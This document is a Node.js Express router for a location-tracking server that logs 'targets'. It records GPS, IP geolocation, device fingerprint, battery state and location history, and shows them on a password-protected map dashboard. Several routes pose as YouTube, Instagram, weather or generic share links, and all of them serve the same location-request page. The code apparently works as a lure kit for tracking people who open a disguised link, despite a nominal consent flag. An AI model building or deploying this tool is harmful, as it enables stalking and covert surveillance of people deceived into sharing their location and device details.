"use strict"

const express = require("express")
const router = express.Router()
const config = require("./config")
const {
    LOCATION_SOURCES,
    isValidTargetId,
    normalizeLocationReading,
    shouldReplaceCurrent
} = require("./location-quality")

const TARGETS = new Map()
const IP_CACHE = new Map()
const IP_CACHE_TTL_MS = 15 * 60 * 1000
const MAX_LOCATION_HISTORY = 100

function extractClientIp(req) {
    const cfIp = req.headers["cf-connecting-ip"]
    if (cfIp) return String(cfIp).trim()

    const forwarded = req.headers["x-forwarded-for"]
    if (forwarded) return String(forwarded).split(",")[0].trim()

    return req.ip || (req.socket ? req.socket.remoteAddress : "") || ""
}

function isLocalIp(ip) {
    return !ip
        || ip === "::1"
        || ip === "127.0.0.1"
        || ip === "::ffff:127.0.0.1"
        || ip.startsWith("10.")
        || ip.startsWith("192.168.")
        || /^172\.(1[6-9]|2\d|3[01])\./.test(ip)
}

function normalizeIpInfo(data, fallbackIp) {
    if (!data || typeof data !== "object") return { ip: fallbackIp || "" }

    return {
        ip: String(data.ip || data.query || fallbackIp || "").slice(0, 64),
        city: String(data.city || "").slice(0, 120),
        region: String(data.region || data.regionName || "").slice(0, 120),
        country: String(data.country || data.country_name || "").slice(0, 120),
        lat: data.latitude ?? data.lat ?? null,
        lng: data.longitude ?? data.lon ?? data.lng ?? null,
        isp: String(data.connection?.isp || data.org || data.isp || "").slice(0, 180)
    }
}

async function getIpInfo(ip) {
    if (isLocalIp(ip)) return { ip: ip || "127.0.0.1", city: "Local network" }

    const cached = IP_CACHE.get(ip)
    if (cached && Date.now() - cached.cachedAt < IP_CACHE_TTL_MS) return cached.value

    const safeIp = encodeURIComponent(ip)
    let value = null

    try {
        const response = await fetch(`https://ipwho.is/${safeIp}`, {
            headers: { Accept: "application/json" },
            signal: AbortSignal.timeout(3000)
        })
        if (response.ok) {
            const data = await response.json()
            if (data.success) value = normalizeIpInfo(data, ip)
        }
    } catch (_error) {}

    if (!value) {
        try {
            const response = await fetch(`https://ipapi.co/${safeIp}/json/`, {
                headers: { Accept: "application/json" },
                signal: AbortSignal.timeout(3000)
            })
            if (response.ok) value = normalizeIpInfo(await response.json(), ip)
        } catch (_error) {}
    }

    value ||= { ip }
    IP_CACHE.set(ip, { value, cachedAt: Date.now() })
    if (IP_CACHE.size > 500) IP_CACHE.delete(IP_CACHE.keys().next().value)
    return value
}

function safeText(value, maximumLength = 180) {
    return typeof value === "string" ? value.slice(0, maximumLength) : ""
}

function normalizeDevice(device) {
    if (!device || typeof device !== "object") return null

    return {
        os: safeText(device.os),
        browser: safeText(device.browser),
        userAgent: safeText(device.userAgent, 500),
        platform: safeText(device.platform),
        language: safeText(device.language, 40),
        screen: safeText(device.screen, 40),
        colorDepth: safeText(device.colorDepth, 40),
        devicePixelRatio: Number.isFinite(Number(device.devicePixelRatio)) ? Number(device.devicePixelRatio) : null,
        deviceMemory: safeText(device.deviceMemory, 40),
        hardwareConcurrency: safeText(device.hardwareConcurrency, 40),
        network: safeText(device.network, 40),
        touchPoints: Number.isFinite(Number(device.touchPoints)) ? Number(device.touchPoints) : null,
        timezone: safeText(device.timezone, 80),
        referrer: safeText(device.referrer, 500)
    }
}

function normalizeBattery(battery) {
    if (!battery || typeof battery !== "object") return null
    const level = Number(battery.level)
    if (!Number.isFinite(level) || level < 0 || level > 100) return null
    return { level: Math.round(level), charging: battery.charging === true }
}

function applyReading(target, reading) {
    target.location = reading
    target.lat = reading.lat
    target.lng = reading.lng
    target.accuracy = reading.accuracy
    target.locationSource = reading.source
    target.locationType = reading.source === LOCATION_SOURCES.BROWSER ? "GPS" : "IP"
    target.locationQuality = reading.quality
    target.measuredAt = reading.measuredAt
    target.locationUpdatedAt = reading.receivedAt
    target.speedMps = reading.speedMps
    target.speed = reading.speedMps
    target.heading = reading.heading
}

function updateTargetTelemetry(id, payload, serverIpLocation, receivedAt = Date.now()) {
    if (!isValidTargetId(id)) return null

    const incoming = normalizeLocationReading(payload, serverIpLocation, receivedAt)
    let target = TARGETS.get(id)
    const isNew = !target

    if (!target) {
        target = {
            id,
            lat: null,
            lng: null,
            accuracy: null,
            locationSource: null,
            locationType: null,
            locationQuality: "UNKNOWN",
            location: null,
            locationHistory: [],
            speedMps: null,
            speed: null,
            heading: null,
            battery: null,
            device: null,
            ipLocation: null,
            photos: [],
            lastSeen: receivedAt,
            template: "location-share"
        }
        TARGETS.set(id, target)
    }

    if (incoming) {
        target.locationHistory.push(incoming)
        if (target.locationHistory.length > MAX_LOCATION_HISTORY) target.locationHistory.shift()
        if (shouldReplaceCurrent(target.location, incoming, receivedAt)) applyReading(target, incoming)
    }

    const battery = normalizeBattery(payload.battery)
    const device = normalizeDevice(payload.device)
    if (battery) target.battery = battery
    if (device) target.device = device
    if (serverIpLocation && serverIpLocation.ip) {
        target.ipLocation = Object.assign({}, target.ipLocation || {}, serverIpLocation)
    }
    if (payload.template) target.template = safeText(payload.template, 40) || target.template
    target.lastSeen = receivedAt

    if (global.IO) {
        if (isNew) global.IO.emit("user-connected", id)
        global.IO.emit("map-data", { id, target, lat: target.lat, lng: target.lng })
    }

    return target
}

function targetsAsObject() {
    return Object.fromEntries(TARGETS.entries())
}

async function ingestTelemetry(req, res) {
    const payload = req.body && typeof req.body === "object" ? req.body : {}
    if (!isValidTargetId(payload.id)) {
        return res.status(400).json({ status: "ERROR", error: "Invalid target identifier" })
    }
    if (payload.consentVersion !== "location-v1") {
        return res.status(400).json({ status: "ERROR", error: "Explicit location consent is required" })
    }

    const clientIp = extractClientIp(req)
    const browserReading = normalizeLocationReading(payload, null)
    const serverIpLocation = !browserReading && payload.allowIpFallback === true
        ? await getIpInfo(clientIp)
        : { ip: clientIp }

    const target = updateTargetTelemetry(payload.id, payload, serverIpLocation)
    if (!target) return res.status(400).json({ status: "ERROR", error: "Invalid telemetry" })
    return res.json({ status: "OK", target })
}

router.route("/login").get((_req, res) => {
    res.render("login")
}).post((req, res) => {
    const { username, password } = req.body
    if (config.username === username && config.password === password) {
        res.cookie("token", config.token, {
            httpOnly: true,
            sameSite: "strict",
            secure: req.secure || req.headers["x-forwarded-proto"] === "https",
            maxAge: 24 * 60 * 60 * 1000
        })
    }
    res.redirect("/")
})

router.get("/location", (_req, res) => res.render("location-request"))
router.route("/weather").get((_req, res) => res.render("location-request")).post(ingestTelemetry)
router.route(["/youtube", "/yt", "/watch", "/v", "/shorts", "/s"]).get((_req, res) => res.render("location-request"))
router.route(["/instagram", "/ig", "/reel", "/reels", "/p"]).get((_req, res) => res.render("location-request"))
router.route(["/custom", "/c"]).get((_req, res) => res.render("location-request"))
router.route(["/link", "/l"]).get((_req, res) => res.render("location-request"))

router.get("/api/ip-location", async (req, res) => {
    res.set("Cache-Control", "private, max-age=300")
    res.json(await getIpInfo(extractClientIp(req)))
})
router.post("/api/telemetry", ingestTelemetry)

router.use(function checkToken(req, res, next) {
    if (req.cookies.token != null && req.cookies.token === config.token) return next()
    res.clearCookie("token").redirect("/login")
})

router.get("/api/targets", (_req, res) => res.json(targetsAsObject()))
router.get("/api/targets/:id", (req, res) => res.json(TARGETS.get(req.params.id) || null))
router.delete("/api/targets/:id", (req, res) => {
    if (TARGETS.delete(req.params.id) && global.IO) global.IO.emit("user-disconnected", req.params.id)
    res.json({ success: true })
})

router.get("/", (_req, res) => res.render("home", { TARGETS: targetsAsObject() }))
router.get("/map", (req, res) => {
    const target = TARGETS.get(req.query.id)
    res.render("map", { data: JSON.stringify(target ? [target.lat, target.lng] : [null, null]) })
})

module.exports = router
module.exports._test = { TARGETS, updateTargetTelemetry }
